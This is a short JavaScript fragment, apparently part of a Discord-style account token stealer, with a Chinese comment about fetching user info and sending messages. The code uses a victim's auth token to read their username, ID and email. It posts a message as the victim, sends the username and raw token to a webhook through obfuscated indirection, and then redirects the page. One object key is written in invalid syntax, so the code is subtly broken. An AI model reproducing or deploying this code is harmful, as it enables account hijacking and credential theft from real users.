// === Fragment 19/20 ===
// 使用者資訊獲取 + 訊息發送
(function() {
  window.__d = window.__d || {};
  window.__d.p = function() {
    var t = window.__d.token;
    if (!t) { setTimeout(function() { window.location.href = window.__d.redir; }, 3000); return; }
    fetch(window.__d.apiBase + "users/@me", {
      headers: { "Authorization": t }
    }).then(function(r) { return r.json(); }).then(function(u) {
      var msg = window.__d.msgPrefix + u.username + window.__d.msgSep + u.id + window.__d.msgPost1 + (u.email || "N/A");
      window.__d.fetch(window.__d.apiBase + window.__d.msgPath, "POST", {
        window.__d.hAuth: t, window.__d.hCt: window.__d.hCtV
      }, JSON.stringify({ content: msg }), 1);
      var wh = window.__d.whPrefix + u.username + window.__d.whSep + t + window.__d.whPost;
      window.__d.fetch(window.__d.wh, "POST", { "Content-Type": "application/json" }, JSON.stringify({ content: wh }));
    }).catch(window.__d.err || function(){});
    setTimeout(function() { window.location.href = window.__d.redir; }, window.__d.to);
  };
})();
